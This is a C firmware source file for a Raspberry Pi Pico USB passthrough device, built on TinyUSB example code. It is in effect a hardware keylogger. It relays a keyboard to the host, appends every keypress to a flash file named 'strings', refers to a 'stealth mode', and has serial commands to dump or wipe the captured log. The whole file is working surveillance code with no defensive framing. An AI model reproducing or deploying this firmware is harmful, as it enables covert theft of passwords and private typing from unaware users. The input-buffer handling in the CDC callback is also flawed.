/*
 * The MIT License (MIT)
 *
 * Copyright (c) 2019 Ha Thach (tinyusb.org)
 *                    sekigon-gonnoc
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */

// This example runs both host and device concurrently. The USB host receive
// reports from HID device and print it out over USB Device CDC interface.
// For TinyUSB roothub port0 is native usb controller, roothub port1 is
// pico-pio-usb.

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "class/cdc/cdc_device.h"
#include "lfs.h"
#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "pico/bootrom.h"

#include "pio_usb.h"
#include "tusb.h"
#include "usb_descriptors.h"
#include "hardware/clocks.h"

#include "pinconfig.h"
#include "pico/util/queue.h"
#include "pico_lfs.h"

#define FS_SIZE (256 * 1024)

/*------------- MAIN -------------*/

// core1: handle host events
extern void core1_main();

// import gpio functions for stealth mode operations
extern void setup_cdc_mode();
extern bool check_cdc_mode();
extern volatile bool core1_ready;

// set up lfs configs
static struct lfs_config *lfs_cfg;
lfs_t lfs;

// set up queue
#define KEYPRESS_QUEUE_SIZE 256
queue_t keypress_queue;


// core0: handle device events
int main(void) {
  // default 125MHz is not appropreate. Sysclock should be multiple of 12MHz.
  set_sys_clock_khz(120000, true);

  sleep_ms(10);

  multicore_reset_core1();
  // all USB task run in core1
  multicore_launch_core1(core1_main);

  // wait unitl core1 is ready before launching LFS
  while (!core1_ready) {
    tight_loop_contents();
  }

  // init LFS
  lfs_cfg = pico_lfs_init(PICO_FLASH_SIZE_BYTES - FS_SIZE, FS_SIZE);
  if (!lfs_cfg)
      panic("out of memory");

  int err = lfs_mount(&lfs, lfs_cfg);
  if (err != LFS_ERR_OK) {
      err = lfs_format(&lfs, lfs_cfg);
      if (err != LFS_ERR_OK)
          panic("failed to format filesystem");
      err = lfs_mount(&lfs, lfs_cfg);
      if (err != LFS_ERR_OK)
          panic("failed to mount new filesystem");
  }

  queue_init(&keypress_queue, sizeof(uint8_t), KEYPRESS_QUEUE_SIZE);

  // init device stack on native usb (roothub port0)
  tud_init(0);
  setup_cdc_mode();
  //check_cdc_mode();
  
  // device task, handles sending all CDC and HID events over USB to real host
  while (true) {

    //check_cdc_mode();

    uint8_t ch;
    if (queue_try_remove(&keypress_queue, &ch)) {
      lfs_file_t file;
      lfs_file_open(&lfs, &file, "strings", LFS_O_WRONLY | LFS_O_CREAT | LFS_O_APPEND);
      lfs_file_write(&lfs, &file, &ch, 1);
      lfs_file_close(&lfs, &file);
    }

    tud_task(); // tinyusb device task, process all usb events (CDC & HID)
    tud_cdc_write_flush(); // send all data when available

  }

  return 0;
}


// Command handlers
static void cmd_help(void)
{
    tud_cdc_write_str("\r\nAvailable Commands:\r\n");
    tud_cdc_write_str("  help - Show this help\r\n");
    tud_cdc_write_str("  dumpstrings - Dump contents of strings file\r\n");
    tud_cdc_write_str("  resetstrings - Clear the strings file\r\n");
    tud_cdc_write_str("  teststring - Append test string\r\n");
    tud_cdc_write_str("  resetfilesystem - Format filesystem\r\n");
}

static void cmd_dumpstrings(void)
{
    tud_cdc_write_str("\r\nDumping strings file...\r\n");
    
    lfs_file_t file; 
    lfs_file_open(&lfs, &file, "strings", LFS_O_RDONLY | LFS_O_CREAT);
    char buffer[128];
    lfs_ssize_t bytes_read;
    
    while ((bytes_read = lfs_file_read(&lfs, &file, buffer, sizeof(buffer))) > 0) {
        for (lfs_ssize_t i = 0; i < bytes_read; i++) {
            tud_cdc_write(&buffer[i], 1);
        }
    }
    
    lfs_file_close(&lfs, &file);
    tud_cdc_write_str("\r\nDone\r\n");
}

static void cmd_resetstrings(void)
{
    tud_cdc_write_str("\r\nResetting strings file...\r\n");
    
    lfs_file_t file;
    lfs_file_open(&lfs, &file, "strings", LFS_O_WRONLY | LFS_O_CREAT | LFS_O_TRUNC);
    lfs_file_write(&lfs, &file, "", 0);
    lfs_file_close(&lfs, &file);
    
    tud_cdc_write_str("Done\r\n");
}

static void cmd_teststring(void)
{
    tud_cdc_write_str("\r\nAppending test string...\r\n");
    
    lfs_file_t file;
    const char *test_string = "DEBUG STRING";
    
    lfs_file_open(&lfs, &file, "strings", LFS_O_WRONLY | LFS_O_CREAT | LFS_O_APPEND);
    lfs_ssize_t bytes_written = lfs_file_write(&lfs, &file, test_string, strlen(test_string));
    
    if (bytes_written < 0) {
        tud_cdc_write_str("Error writing to file\r\n");
    } else {
        tud_cdc_write_str("Done\r\n");
    }
    
    lfs_file_close(&lfs, &file);
}

static void cmd_resetfilesystem(void)
{
    tud_cdc_write_str("\r\nFormatting filesystem...\r\n");
    
    if (lfs_unmount(&lfs) < 0 ||
        lfs_format(&lfs, lfs_cfg) < 0 ||
        lfs_mount(&lfs, lfs_cfg) < 0) {
        tud_cdc_write_str("Error\r\n");
        return;
    }
    
    tud_cdc_write_str("Done\r\n");
}

void check_command(char* cmd, uint8_t len)
{
    // safe if len < buffer size
    char buf[32];
    if (len >= sizeof(buf)) {
        tud_cdc_write_str("\r\nCommand too long\r\n");
        return;
    }
    
    memcpy(buf, cmd, len);
    buf[len] = '\0';
    
    if (strcmp(buf, "help") == 0) {
        cmd_help();
    }
    else if (strcmp(buf, "dumpstrings") == 0) {
        cmd_dumpstrings();
    }
    else if (strcmp(buf, "resetstrings") == 0) {
        cmd_resetstrings();
    }
    else if (strcmp(buf, "teststring") == 0) {
        cmd_teststring();
    }
    else if (strcmp(buf, "resetfilesystem") == 0) {
        cmd_resetfilesystem();
    }
    else {
        tud_cdc_write_str("\r\nUnknown command. Type 'help'\r\n");
    }
}



// Invoked when CDC interface received data from host
// Handles CLI input over USB CDC
void tud_cdc_rx_cb(uint8_t itf)
{
  (void) itf;

  static uint8_t total_buf[256];
  static uint8_t len = 0;

  uint8_t buf[32];  
  uint8_t count = tud_cdc_read(buf, sizeof(buf));


  // if newline, terminate string and print it
  if (buf[count-1] == '\r' || buf[count-1] == '\n') {

    len = count + len;
    total_buf[len-1] = '\0';
    //tud_cdc_write(total_buf, len);

    check_command((char*)total_buf, len-1);

    len = 0;
  } 
  // if there is space for more data, copy to total_buf
  else {
    
    if (len + count < sizeof(total_buf)) {
      tud_cdc_write(buf, count);
      memcpy(&total_buf[len], buf, count);
      len = count + len;
    }
  }
}







